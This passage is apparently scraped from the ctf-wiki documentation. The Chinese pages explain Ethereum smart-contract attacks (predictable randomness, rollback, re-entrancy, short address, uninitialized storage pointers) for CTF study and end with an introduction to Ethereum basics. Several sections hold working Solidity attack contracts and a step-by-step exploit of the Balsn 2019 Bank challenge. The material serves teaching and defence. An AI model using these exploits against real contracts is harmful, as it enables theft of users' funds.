的首位判断\n\n以太坊区块链上的所有交易都是确定性的状态转换操作，每笔交易都会改变以太坊生态系统的全球状态，并且是以一种可计算的方式进行，这意味着其没有任何的不确定性。所以在区块链生态系统内，不存在熵或随机性的来源。如果使用可以被挖矿的矿工所控制的变量，如区块哈希值，时间戳，区块高低或是 Gas 上限等作为随机数的熵源，产生的随机数并不安全。\n\n所以编写如下攻击脚本，调用 10 次 `exploit()` 即可\n\n```solidity\npragma solidity ^0.4.18;\n\ncontract CoinFlip {\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  function CoinFlip() public {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(block.blockhash(block.number-1));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n\ncontract hack{\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n  \n  address instance_address = ContractAddress;\n  CoinFlip c = CoinFlip(instance_address);\n  \n  function exploit() public {\n    uint256 blockValue = uint256(block.blockhash(block.number-1));\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    c.flip(side);\n  }\n}\n```\n\n### 题目\n\n- 0CTF Final 2018 : ZeroLottery\n\n## 使用 Blockhash 的伪随机数\n\n### 原理\n\nBlockhash 是一个特殊的区块变量，EVM 只能获取到当前区块之前的 256 个区块的 blockhash （**不含当前区块**），对于这 256 个之外的区块返回 0。使用 blockhash 可能存在几种问题。\n\n1. 误用，如 `block.blockhash(block.number)` 恒为零。\n2. 使用过去区块的有效 blockhash ，可以编写攻击合约获取相同值。\n3. 将猜数字和开奖的交易分开在两个不同区块中，并且使用猜数字时还不知道的某个区块的 blockhash 作为熵源，则可以等待 256 个区块后再进行开奖，消除 blockhash 的不确定性。\n\n### 题目\n\n- [Capture The Ether](https://capturetheether.com/challenges/) : Predict the block hash、Guess the new number\n- 华为云安全 2020 : ethenc\n\n## 回滚攻击\n\n### 原理\n\n在某些情况下，获取随机数可能过于困难或繁琐，这时可以考虑使用回滚攻击。回滚攻击的思想很简单：完全碰运气，输了就“耍赖”，通过抛出异常使整个交易回滚不作数；赢的时候则不作处理，让交易被正常确认。\n\n### 例子\n\n这里以 0ctf 2018 ZeroLottery 为例，部分关键代码如下。其中 `n` 为随机数，并且省略了其生成方式，但我们知道它的范围是 0 至 7。\n\n```solidity\ncontract ZeroLottery {\n    ...\n    mapping (address => uint256) public balanceOf;\n    ...\n    function bet(uint guess) public payable {\n        require(msg.value > 1 ether);\n        require(balanceOf[msg.sender] > 0);\n\n        uint n = ...;\n\n        if (guess != n) {\n            balanceOf[msg.sender] = 0;\n            // charge 0.5 ether for failure\n            msg.sender.transfer(msg.value - 0.5 ether);\n            return;\n        }\n\n        // charge 1 ether for success\n        msg.sender.transfer(msg.value - 1 ether);\n        balanceOf[msg.sender] = balanceOf[msg.sender] + 100;\n    }\n    ...\n}\n```\n\n可以观察到题目合约在我们猜对或猜错时收费不同，分别为 1 ether 或 0.5 ether ，我们猜数时多给的钱会转账还给我们。结合智能合约收到转账时会调用 fallback 函数的知识点，假设每次使用 2 ether 去猜数，如果 fallback 函数收到 1.5 ether 就回滚。我们可以固定一个数字一直猜，只有猜对的交易才会被确认。\n\n```solidity\nfunction guess() public {\n    task.bet.value(2 ether)(1);\n}\nfunction () public payable {\n    require(msg.value != 1.5 ether);\n}\n```\n\n并不是所有题目都涉及转账操作，但是通常都会有一个变量象征着正确次数等，ZeroLottery 中就有 `balanceOf[msg.sender]` 在猜对时会增加，猜错时清零，也可以通过它判断是否猜对。\n\n```solidity\nfunction guess() public {\n    task.bet.value(2 ether)(1);\n    require(task.balanceOf(this));\n}\n```\n\n以上两种方法都是选定一个数字重复猜测，在本题八分之一的概率之下猜对五次获胜，需要大约 40 笔交易才能完成。由于同一个区块中产生的随机数往往相同，我们可以稍作改进，在每个区块中将所有八种可能都猜测一遍，其中必定包含正确的数字。进一步，如果在单笔交易中连续猜五次，那么只需要有一笔交易成功确认就可以完成题目要求。实际上因为题目合约的 `bet` 函数自带了 `balanceOf` 非零的检查，如果我们连猜多次，失败了也会自动回滚。\n\n### 题目\n\n- 0ctf final 2018 : ZeroLottery\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n", "timestamp": "2025-10-21T22:02:42.746975"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/re-entrancy.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/re-entrancy.md", "content": "# Re-Entrancy\n\n重入攻击是智能合约中的经典攻击。以太坊 The DAO 项目遭受的重入攻击直接导致了以太坊（ETH）和以太坊经典（ETC）的硬分叉。\n\n## 原理\n假设有一个银行合约实现了以下取款功能，在 `balanceOf[msg.sender]` 充足时，合约会转账相应数量的以太币给调用者，并且将 `balanceOf` 减去相应值：\n\n```solidity\ncontract Bank {\n    mapping(address => uint256) public balanceOf;\n    ...\n    function withdraw(uint256 amount) public {\n        require(balanceOf[msg.sender] >= amount);\n        msg.sender.call.value(amount)();\n        balanceOf[msg.sender] -= amount;\n    }\n}\n```\n\n这个实现的问题在于，“先给钱后记账”。在以太坊中，合约的调用者可以是另一个智能合约，转账时收款合约的 fallback 函数会被调用。若 fallback 函数内再一次调用了对方的 withdraw 函数，由于此时 `balanceOf` 尚未减少，require 的条件仍然满足，导致可以再次取款。需要注意的是，fallback 函数需要限制重入的次数，否则会因为无限地循环调用，导致 gas 不足。假设攻击合约的存款有 1 ether，可以如下实现取出 2 ether：\n\n```solidity\ncontract Hacker {\n    bool status = false;\n    Bank b;\n\n    constructor(address addr) public {\n        b = Bank(addr);\n    }\n\n    function hack() public {\n        b.withdraw(1 ether);\n    }\n\n    function() public payable {\n        if (!status) {\n            status = true;\n            b.withdraw(1 ether);\n        }\n    }\n}\n```\n\n此外有几个注意点：\n\n- 目标合约使用 call 发送以太币时，默认提供所有剩余 gas；call 操作改为对提款者合约的调用亦可实现攻击；但如果使用 transfer 或者 send 来发送以太币，只有 2300 gas 供攻击合约使用，是不足以完成重入攻击的。\n- 执行重入攻击前，需要确认目标合约有足够的以太币来向我们多次转账。如果目标合约没有 payable 的 fallback 函数，则需要新建一个合约，通过 `selfdestruct` 自毁强制转账。\n- 上述 fallback 实现中，先改写 `status` 后重入。如果反过来则还是会无限循环调用，这和重入漏洞的道理是一致的。\n\n重入漏洞与整数下溢出漏洞关联密切。在上述攻击后，攻击合约的存款由 1 ether 变为 -1 ether。但注意到存款由 uint256 保存，负数实际上保存为一个极大的正数，后续攻击合约可以继续使用这个大数额的存款。\n\n## 题目\n\n### 强网杯 2019\n- 题目名称 babybank\n\n### N1CTF 2019\n- 题目名称 h4ck\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n", "timestamp": "2025-10-21T22:02:42.879630"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/shortaddress.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/shortaddress.md", "content": "# Short Address Attack\n\n## 原理\n\n短地址攻击，利用 EVM 在参数长度不够时自动在右方补 0 的特性，通过去除钱包地址末位的 0，达到将转账金额左移放大的效果。\n\n## 例子\n\n```solidity\npragma solidity ^0.4.10;\n\ncontract Coin {\n    address owner;\n    mapping (address => uint256) public balances;\n\n    modifier OwnerOnly() { require(msg.sender == owner); _; }\n\n    function ICoin() { owner = msg.sender; }\n    function approve(address _to, uint256 _amount) OwnerOnly { balances[_to] += _amount; }\n    function transfer(address _to, uint256 _amount) {\n        require(balances[msg.sender] > _amount);\n        balances[msg.sender] -= _amount;\n        balances[_to] += _amount;\n    }\n}\n```\n\n具体代币功能的合约 Coin，当 A 账户向 B 账户转代币时调用 `transfer()` 函数，例如 A 账户（0x14723a09acff6d2a60dcdf7aa4aff308fddc160c）向 B 账户（0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db）转 8 个 Coin，`msg.data` 数据为：\n\n```\n0xa9059cbb  -> bytes4(keccak256(\"transfer(address,uint256)\")) 函数签名\n0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db  -> B 账户地址（前补 0 补齐 32 字节）\n0000000000000000000000000000000000000000000000000000000000000008  -> 0x8（前补 0 补齐 32 字节）\n```\n\n那么短地址攻击是怎么做的呢，攻击者找到一个末尾是 `00` 账户地址，假设为 0x4b0897b0513fdc7c541b6d9d7e929c4e5364d200，那么正常情况下整个调用的 `msg.data` 应该为：\n\n```\n0xa9059cbb  -> bytes4(keccak256(\"transfer(address,uint256)\")) 函数签名\n0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200  -> B 账户地址（注意末尾 00）\n0000000000000000000000000000000000000000000000000000000000000008  -> 0x8（前补 0 补齐 32 字节）\n```\n\n但是如果我们将 B 地址的 `00` 吃掉，不进行传递，也就是说我们少传递 1 个字节变成 4+31+32：\n\n```\n0xa9059cbb  -> bytes4(keccak256(\"transfer(address,uint256)\")) 函数签名\n0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2  -> B 地址（31 字节）\n0000000000000000000000000000000000000000000000000000000000000008  -> 0x8（前补 0 补齐 32 字节）\n```\n\n当上面数据进入 EVM 进行处理时，对参数进行编码对齐后补 `00` 变为：\n\n```\n0xa9059cbb\n0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d200\n0000000000000000000000000000000000000000000000000000000000000800\n```\n\n也就是说，恶意构造的 `msg.data` 通过 EVM 解析补 0 操作，导致原本 0x8 = 8 变为了 0x800 = 2048\n\n上述 EVM 对畸形字节的 `msg.data` 进行补位操作的行为其实就是短地址攻击的原理\n\n## 题目\n\n这个目前没有题目，基本已经被修复。不过可以复现成功，但是不能通过 Remix 复现，因为客户端会检查地址长度；也不能通过 sendTransaction()，因为 `web3` 中也加了保护。\n\n但是，可以使用 **geth** 搭建私链，使用 sendRawTransaction() 发送交易复现，可自行尝试。\n\n!!! note\n    注：目前主要依靠客户端主动检查地址长度来避免该问题，另外 `web3` 层面也增加了参数格式校验。虽然 EVM 层仍然可以复现，但是在实际应用场景中基本没有问题。", "timestamp": "2025-10-21T22:02:42.987327"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/attacks/uninitialized-storage-pointer.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/attacks/uninitialized-storage-pointer.md", "content": "# Uninitialized Storage Pointer\n\n## 原理\n未初始化的存储指针是指在 EVM 中未进行初始化的 storage 变量，这个变量会指向其他变量的区域，从而更改其他变量的值。\n\n## 例子\n### 典型例子\n我们来看下面这个例子：\n\n```solidity\npragma solidity ^0.4.24;\n\ncontract example1{\n    uint public a;\n    address public b;\n\n    struct Wallet{\n        uint value;\n        address addr;\n    }\n\n    function setValue(uint _a,address _b) public {\n        a = _a;\n        b = _b;\n    }\n\n    function attack(uint _value, address _addr) public {\n        Wallet wallet;\n        wallet.value = _value;\n        wallet.addr = _addr;\n    }\n}\n```\n\n将这份代码放入 Remix 中，它会提示 Uninitialized Storage Pointer：\n\n![uninitialized-storage-pointer-error](figure/uninitialized-storage-pointer-error.png)\n\n在我们部署后，首先使用 setValue 函数将 a 和 b 的值分别设为 1 和 0x10aA1C20aD710B823f8c1508cfC12D5d1199117E，可以从交易中发现设置成功：\n\n![uninitialized-storage-pointer-setvalue](figure/uninitialized-storage-pointer-setvalue.png)\n\n然后我们调用 attack 函数，传入的 _value 和 _addr 值分别为 2 和 0xa3b0D4BBF17F38e00F68Ce73f81D122FB1374ff6，可以从交易中发现 a 和 b 被传入的 _value 和 _addr 值覆盖了：\n\n![uninitialized-storage-pointer-attack](figure/uninitialized-storage-pointer-attack.png)\n\n这个例子的修复方案是使用 mapping 进行结构体的初始化，并使用 storage 进行拷贝：\n\n```solidity\npragma solidity ^0.4.24;\n\ncontract example1{\n    uint public a;\n    address public b;\n\n    struct Wallet{\n        uint value;\n        address addr;\n    }\n\n    mapping (uint => Wallet) wallets;\n\n    function setValue(uint _a,address _b) public {\n        a = _a;\n        b = _b;\n    }\n\n    function fix(uint _id, uint _value, address _addr) public {\n        Wallet storage wallet = wallets[_id];\n        wallet.value = _value;\n        wallet.addr = _addr;\n    }\n}\n```\n\n不仅仅是 struct 会遇到这个问题，数组也有同样的问题。我们来看下面的另一个例子：\n\n```solidity\npragma solidity ^0.4.24;\n\ncontract example2{\n    uint public a;\n    uint[] b;\n\n    function setValue(uint _a) public {\n        a = _a;\n    }\n\n    function attack(uint _value) public {\n        uint[] tmp;\n        tmp.push(_value);\n        b = tmp;\n    }\n}\n```\n\n将这份代码放入 Remix 中，它也会提示 Uninitialized Storage Pointer：\n\n![uninitialized-storage-pointer-error2](figure/uninitialized-storage-pointer-error2.png)\n\n在我们部署后，首先使用 setValue 函数将 a 的值设为 1，可以从交易中发现设置成功：\n\n![uninitialized-storage-pointer-setvalue2](figure/uninitialized-storage-pointer-setvalue2.png)\n\n然后我们调用 attack 函数，传入的 _value 值为 2，这是因为声明的 tmp 数组也使用 slot 0，数组声明的 slot 存储着本身的长度，所以再 push 导致数组长度增加 1，所以 slot 0 位置存储着数值 2 = a(old) + 1，故 a(new) = 2：\n\n![uninitialized-storage-pointer-attack2](figure/uninitialized-storage-pointer-attack2.png)\n\n这个例子的修复方案是在声明局部变量 tmp 的时候对它进行初始化操作：\n\n```solidity\npragma solidity ^0.4.24;\n\ncontract example2{\n    uint public a;\n    uint[] b;\n\n    function setValue(uint _a) public {\n        a = _a;\n    }\n\n    function fix(uint _value) public {\n        uint[] tmp = b;\n        tmp.push(_value);\n    }\n}\n```\n\n### 2019 BalsnCTF Bank\n以 2019 Balsn CTF 的 Bank 的 WP 作为参考，讲解一下未初始化的存储指针的攻击方式。题目合约的源码如下：\n```solidity\npragma solidity ^0.4.24;\n\ncontract Bank {\n    event SendEther(address addr);\n    event SendFlag(address addr);\n    \n    address public owner;\n    uint randomNumber = 0;\n    \n    constructor() public {\n        owner = msg.sender;\n    }\n    \n    struct SafeBox {\n        bool done;\n        function(uint, bytes12) internal callback;\n        bytes12 hash;\n        uint value;\n    }\n    SafeBox[] safeboxes;\n    \n    struct FailedAttempt {\n        uint idx;\n        uint time;\n        bytes12 triedPass;\n        address origin;\n    }\n    mapping(address => FailedAttempt[]) failedLogs;\n    \n    modifier onlyPass(uint idx, bytes12 pass) {\n        if (bytes12(sha3(pass)) != safeboxes[idx].hash) {\n            FailedAttempt info;\n            info.idx = idx;\n            info.time = now;\n            info.triedPass = pass;\n            info.origin = tx.origin;\n            failedLogs[msg.sender].push(info);\n        }\n        else {\n            _;\n        }\n    }\n    \n    function deposit(bytes12 hash) payable public returns(uint) {\n        SafeBox box;\n        box.done = false;\n        box.hash = hash;\n        box.value = msg.value;\n        if (msg.sender == owner) {\n            box.callback = sendFlag;\n        }\n        else {\n            require(msg.value >= 1 ether);\n            box.value -= 0.01 ether;\n            box.callback = sendEther;\n        }\n        safeboxes.push(box);\n        return safeboxes.length-1;\n    }\n    \n    function withdraw(uint idx, bytes12 pass) public payable {\n        SafeBox box = safeboxes[idx];\n        require(!box.done);\n        box.callback(idx, pass);\n        box.done = true;\n    }\n    \n    function sendEther(uint idx, bytes12 pass) internal onlyPass(idx, pass) {\n        msg.sender.transfer(safeboxes[idx].value);\n        emit SendEther(msg.sender);\n    }\n    \n    function sendFlag(uint idx, bytes12 pass) internal onlyPass(idx, pass) {\n        require(msg.value >= 100000000 ether);\n        emit SendFlag(msg.sender);\n        selfdestruct(owner);\n    }\n\n}\n```\n\n我们的目标是要执行 emit SendFlag(msg.sender)，很明显不能通过 sendFlag 函数来触发，因为我们肯定不能满足 msg.value >= 100000000 ether。\n\n如果我们仔细观察代码，会发现有两处未初始化的存储指针：\n\n```solidity\nmodifier onlyPass(uint idx, bytes12 pass) {\n[...]\n    FailedAttempt info; <--\n[...]\n}\n\nfunction deposit(bytes12 hash) payable public returns(uint) {\n[...]\n    SafeBox box; <--\n[...]\n}\n```\n\n那么我们需要思考如何利用它们。我们首先来看看合约刚创建的时候的 slot 的布局：\n\n```\n-----------------------------------------------------\n|     unused (12)     |          owner (20)         | <- slot 0\n-----------------------------------------------------\n|                 randomNumber (32)                 | <- slot 1\n-----------------------------------------------------\n|               safeboxes.length (32)               | <- slot 2\n-----------------------------------------------------\n|       occupied by failedLogs but unused (32)      | <- slot 3\n-----------------------------------------------------\n```\n\nonlyPass 中的 FailedAttempt 的布局如下，它会覆盖原先的 slot0 到 slot2 的内容：\n\n```\n-----------------------------------------------------\n|                      idx (32)                     |\n-----------------------------------------------------\n|                     time (32)                     |\n-----------------------------------------------------\n|          tx.origin (20)      |   triedPass (12)   |\n-----------------------------------------------------\n```\n\ndeposit 中的 SafeBox 的布局如下，它会覆盖原先的 slot0 到 slot1 的内容：\n\n```\n-----------------------------------------------------\n| unused (11) | hash (12) | callback (8) | done (1) |\n-----------------------------------------------------\n|                     value (32)                    |\n-----------------------------------------------------\n```\n\n如果当 FailedAttempt 中的 tx.origin 足够大的时候，就可以覆盖 safeboxes.length 并把它也改成一个足够大的值，这样在调用 withdraw 函数的时候就可以将访问到 failedLogs，我们便可以控制 callback 为任意的内容并控制程序执行流。\n\n那么我们需要控制执行流到什么地方呢？在 opcodes 那节介绍过，跳转指令只能跳转到 JUMPDEST 处，我们需要控制程序执行流跳转到 emit SendFlag(msg.sender) 前的地方，也就是下面所示的 070F 处：\n\n```\n06F6 6A PUSH11 0x52b7d2dcc80cd2e4000000\n0702 34 CALLVALUE\n0703 10 LT\n0704 15 ISZERO\n0705 15 ISZERO\n0706 15 ISZERO\n0707 61 PUSH2 0x070f\n070A 57 JUMPI\n070B 60 PUSH1 0x00\n070D 80 DUP1\n070E FD REVERT\n070F 5B JUMPDEST <---- here\n0710 7F PUSH32 0x2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579\n0731 33 CALLER\n0732 60 PUSH1 0x40\n0734 51 MLOAD\n0735 80 DUP1\n0736 82 DUP3\n```\n\n\n最后我们来描述一下攻击的具体步骤：\n\n- 寻找一个 address 开头较大的账户，之后的操作都用该账户进行。\n- 由于 failedLogs 是 mapping 加上数组的形式，所以计算 `target = keccak256(keccak256(msg.sender||3)) + 2` 的值，也就是 failedLogs[msg.sender][0] 中的 tx.origin | triedPass 的 slot 位置。\n- 计算 safeboxes 数组中第一个元素所在的 slot 的位置，也就是 `base = keccak256(2)`。\n- 计算 target 在 safeboxes 数组中的索引，由于 safeboxes 数组中一个元素会占据两个 slot，所以计算出来为 `idx = (target - base) // 2`。\n- 判断 (target - base) % 2 是否为 0，如果是则 tx.origin | triedPass 刚好可以覆盖到 unused | hash | callback | done，进而可以控制到 callback；否则返回第一步。\n- 判断 (msg.sender << (12 * 8)) 是否大于 idx，如果是则 safeboxes 可以访问到 target 处；否则返回第一步。\n- 调用 `deposit` 函数，设置传入的 hash 值为 0x000000000000000000000000 并附带 1 ether，这样我们便可以设置 safeboxes[0].callback = sendEther。\n- 调用 `withdraw` 函数，设置传入的 idx 值为 0，pass 值为 0x111111111111110000070f00，由于上一步我们设置了 safeboxes[0].callback = sendEther，那么这一步便会调用 sendEther 函数，进而走到 onlyPass 中的 if 分支中，使得 failedLogs[msg.sender][0] 中的 triedPass 被修改为了我们传入的 pass 值，同时这步操作也修改了 safeboxes.length 为 msg.sender | pass。\n- 调用 `withdraw` 函数，设置传入的 idx 值为我们在第四步中所计算出的 idx 值，pass 值为 0x000000000000000000000000，那么程序执行流便会跳转到 emit SendFlag(msg.sender) 继续执行，最终目标合约会自毁，攻击成功。\n\n!!! note\n    注：攻击步骤中的 slot 计算规则可以在 Ethereum Storage 节中查看。\n\n\n## 题目\n\n### Balsn 2019\n- 题目名称 Bank\n\n### RCTF 2020\n- 题目名称 roiscoin\n\n### Byte 2019\n- 题目名称 hf\n\n### 数字经济大赛 2019\n- 题目名称 cow\n- 题目名称 rise\n\n!!! note\n    注：题目附件相关内容可至 [ctf-challenges/blockchain](https://github.com/ctf-wiki/ctf-challenges/tree/master/blockchain) 仓库寻找。\n\n## 参考\n\n- [以太坊 Solidity 未初始化存储指针安全风险浅析](https://github.com/slowmist/papers/blob/master/Solidity_Unintialised_Storage_Pointers_Security_Risk.pdf)\n- [Balsn CTF 2019 - Bank](https://x9453.github.io/2020/01/16/Balsn-CTF-2019-Bank/)\n", "timestamp": "2025-10-21T22:02:43.115282"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/blockchain/ethereum/basics.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/blockchain/ethereum/basics.md", "content": "# Ethereum Basics\n\n对智能合约一些基础知识的介绍。\n\n## Solidity\n\n> Solidity is an object-oriented programming language for writing smart contracts. It is used for implementing smart contracts on various blockchain platforms, most notably, Ethereum. It was developed by Christian Reitwiessner, Alex Beregszaszi, and several former Ethereum core contributors to enable writing smart contracts on blockchain platforms such as Ethereum.  ------  from [wikipedia](https://en.wikipedia.org/wiki/Solidity)\n\nSolidity 是一种用于编写智能合约的高级语言，语法类似于 JavaScript。在以太坊平台上，Solidity 编写的智能合约可以被编译成字节码在以太坊虚拟机 EVM 上运行。\n\n可参考 [官方网站](https://docs.soliditylang.org/en/latest/) 进行学习，不再展开介绍。\n\n## MetaMask\n\n非常好用也是用的最多的以太坊钱包，头像是小狐狸标识，Chrome 提供了其插件，其不仅可以管理外部账户，而且可以便捷切换测试链网络，并且可以自定义 RPC 网络。\n\n!!! info\n    一个外部账户通常由私钥文件控制，拥有私钥的用户就可以拥有对应地址的账户里的 Ether 使用权。我们通常把管理这些数字密钥的软件称为钱包，而我们所说的备份钱包其实就是备份账户的私钥文件。\n\n## Remix\n\n基于浏览器的 Solidity 编译器和集成开发环境，提供了交互式界面，以及编译、调用测试、发布等一系列功能，使用十分方便。[http://remix.ethereum.org/](http://remix.ethereum.org/#optimize=false&runs=200&evmVersion=null)\n\n## 账户\n\n在以太坊中，一个重要的概念就是账户（Account）。\n\n在以太坊中存在两种类型的账户，分别是外部账户（Externally Owned Account, EOA）和合约账户。\n\n### 外部账户\n\n外部账户是由人创建的，可以存储以太币，是由公钥和私钥控制的账户。每个外部账户拥有一对公私钥，这对密钥用于签署交易，它的地址由公钥决定。外部账户不能包含以太坊虚拟机（EVM）代码。\n\n一个外部账户具有以下特性\n\n- 拥有一定的 Ether\n- 可以发送交易、通过私钥控制\n- 没有相关联的代码\n\n### 合约账户\n\n合约账户是由外部账户创建的账户，包含合约代码。合约账户的地址是由合约创建时合约创建者的地址，以及该地址发出的交易共同计算得出的。\n\n一个合约账户具有以下特性\n\n- 拥有一定的 Ether\n- 有相关联的代码，代码通过交易或者其他合约发送的调用来激活\n- 当合约被执行时，只能操作合约账户拥有的特定存储\n\n!!! note\n    私钥经过一种哈希算法(椭圆曲线算法 ECDSA-secp256k1 )计算生成公钥，计算公钥的 Keccak-256 哈希值，然后取最后 160 位二进制（通常表现为 40 位的 16 进制字符串）形成了地址。其中，公钥和地址都是可以公布的，而私钥，你只能自己悄悄的藏起来，不要丢失，因为你的账户中的资产也会跟着丢掉；不要被别人盗取，因为账户中的资产也会随着被盗取。所以，私钥的保存非常重要。\n\n以太坊中，这两种账户统称为“状态对象”（存储状态）。其中外部账户存储以太币余额状态，而合约账户除了余额还有智能合约及其变量的状态。通过交易的执行，这些状态对象发生变化，而 Merkle 树用于索引和验证状态对象的更新。一个以太坊的账户包含 4 个部分：\n\n- nonce: 已执行交易总数，用来标示该账户发出的交易数量。\n- balance: 账持币数量，记录账户的以太币余额。\n- storageRoot: 存储区的哈希值，指向智能合约账户的存储数据区。\n- codeHash: 代码区的哈希值，指向智能合约账户存储的智能合约代码。\n\n两个外部账户之间的交易只是一个价值转移。但是从外部账户到合约账户的交易会激活合约账户的代码，允许它执行各种操作（例如转移 Token，写入内部存储，创建新的 Token ，执行一些计算，创建新的合约等）。\n\n与外部账户不同，合约账户不能自行发起新的交易。相反，合约帐户只能触发交易以响应其他交易（从外部拥有的帐户或其他合约帐户）。\n\n!!! note \n    注：合约账户和外部账户最大的不同就是它还存有智能合约。\n\n## 交易\n\n以太坊的交易主要是指一条外部账户发送到区块链上另一账户的消息的签名数据包，其主要包含发送者的签名、接收者的地址以及发送者转移给接收者的以太币数量等内容。以太坊上的每一笔交易都需要支付一定的费用，用于支付交易执行所需要的计算开销。计算开销的费用并不是以太币直接计算的，而是引入 Gas 作为执行开销的基本单位，通过 GasPrice 与以太币进行换算的。 \n\nGasPrice 根据市场波动调整，避免以太币价值受市场价格的影响。交易是以太坊整体结构中的重要部分，它将以太坊的账户连接起来，起到价值的传递作用。\n\n### 交易费用\n- Gas: 衡量一笔交易所消耗的计算资源的基本单位\n- Gas Price: 一单位 Gas 所需的手续费（Ether）\n- Gas Limit: 交易发送者愿意为这笔交易执行所支付的最大 Gas 数量\n\n!!! note \n    注：如果交易实际消耗的 Gas (Gas Used) 小于 Gas Limit, 那么执行的矿工只会收取实际计算开销（Gas Used）对应的交易手续费（Gas Used * Gas Price）；而如果 Gas Used 大于 Gas Limit，那么矿工执行过程中会发现 Gas 已被耗尽而交易没有执行完成，此时矿工会回滚到程序执行前到状态，而且收取 Gas Limit 所对应的手续费（GasPrice * Gas Limit）。换句话说，**GasPrice * Gas Limit** 表示用户愿意为一笔交易支付的最高金额。\n\n### 交易内容\n以太坊中的交易（Transaction）是指存储一条从外部账户发送到区块链上另一个账户的消息的签名数据包，它既可以是简单的转账，也可以是包含智能合约代码的消息。一条交易包含以下内容：\n\n- from: 交易发送者的地址，必填；\n- to: 交易接收者的地址，如果为空则意味这是一个创建智能合约的交易；\n- value: 发送者要转移给接收者的以太币数量\n- data: 存在的数据字段，如果存在，则表明该交易是一个创建或者调用智能合约的交易；\n- Gas Limit: 表示交易允许消耗的最大 Gas 数量；\n- GasPrice: 发送者愿意支付给矿工的 Gas 单价；\n- nonce: 用来区别同一账户发出的不同交易的标记；\n- hash: 由以上信息生成的散列值（哈希值）；\n- r、s、v: 交易签名的三个部分，由发送者的私钥对交易 hash 进行签名生成。\n\n以上是以太坊中交易可能包含的内容，在不同场景下，交易有三种类型。\n\n- 转帐交易\n\n转账是最简单的一种交易，从一个账户向另一个账户发送 Ether，发送转账交易时只需要指定交易的发送者、接收者、转移的 Ether 数量即可（在客户端发送交易时，Gas Limit、Gas Price、nonce、hash、签名可以按照默认方式生成），如下所示\n\n```nodejs\nweb3.eth.sendTransaction({\n    from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\",\n    to: \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\",\n    value: 1000\n})\n```\n\n- 创建合约的交易\n\n创建合约是指将合约部署到区块链上，这也是通过交易来完成的。创建合约时，to 字段是一个空字符串，data 字段是合约编译后的二进制代码，在之后合约被调用时，该代码的执行结果将作为合约代码，如下所示\n\n```\nweb3.eth.sendTransaction({\n    from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\",\n    data: \"contract binary code\"\n})\n```\n\n- 执行合约的交易\n\n该交易中，to 字段是要调用的智能合约的地址，通过 data 字段指定要调用的方法以及向该方法传入参数，如下所示\n\n```\nweb3.eth.sendTransaction({\n    from: \"0x88D3052D12527F1FbE3a6E1444EA72c4DdB396c2\",\n    to: \"0x75e65F3C1BB334ab927168Bd49F5C44fbB4D480f\",\n    data: \"hash of the invoked method signature and encoded parameters\"\n})\n```\n\n!!! info\n    根据 to、data 字段内容也可以反过来判断是什么类型的交易，然后可以继续分析。\n\n## Interact with Contracts\n\n- 直接通过 Remix 交互\n- Remix 不能够做到自动化，所以便有开发人员做了一些工作\n    - Python 的 web3.py 库\n    - Nodejs 的 web3.js 库\n    - [Infura](https://infura.io/) 提供了 RPC API 供开发者调用，现支持 Ethereum、Eth2、Filecoin\n\n使用 [Infura](https://infura.io/) 提供的 RPC API，利用 web3.py 或者 web3.js 库与其进行自动化交互\n\nInfura 现支持如下网络的访问点：\n\n|网络          |说明                    |URL|\n|-------------|------------------------|---------------------------------------|\n|Mainnet      |JSON-RPC over HTTPs     |https://mainnet.infura.io/v3/YOUR-PROJECT-ID |\n|Mainnet      |JSON-RPC over websockets|wss://mainnet.infura.io/ws/v3/YOUR-PROJECT-ID|\n|Ropsten      |JSON-RPC over HTTPs     |https://ropsten.infura.io/v3/YOUR-PROJECT-ID |\n|Ropsten      |JSON-RPC over websockets|wss://ropsten.infura.io/ws/v3/YOUR-PROJECT-ID|\n|Rinkeby      |JSON-RPC over HTTPs     |https://rinkeby.infura.io/v3/YOUR-PROJECT-ID |\n|Rinkeby      |JSON-RPC over websockets|wss://rinkeby.infura.io/ws/v3/YOUR-PROJECT-ID|\n|Kovan        |JSON-RPC over HTTPs     |https://kovan.infura.io/v3/YOUR-PROJECT-ID   |\n|Kovan        |JSON-RPC over websockets|wss://kovan.infura.io/ws/v3/YOUR-PROJECT-ID  |\n|Görli        |JSON-RPC over HTTPs     |https://goerli.infura.io/v3/YOUR-PROJECT-ID  